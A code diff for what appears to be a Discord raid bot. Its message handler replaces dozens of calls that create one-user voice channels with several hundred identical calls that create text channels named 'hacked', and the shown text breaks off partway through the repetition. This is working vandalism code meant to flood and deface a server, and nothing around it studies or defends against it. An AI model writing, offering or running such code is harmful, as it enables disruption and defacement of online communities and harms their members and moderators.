@@ -49,333 +49,1148 @@ client.on("message", async msg => {
     await msg.guild.channels.create("hacked", {
       type: "text"
     });
-        
-        await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-          
-        chan.setUserLimit("1");
-      });await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    
-    
+       await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });
+       await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
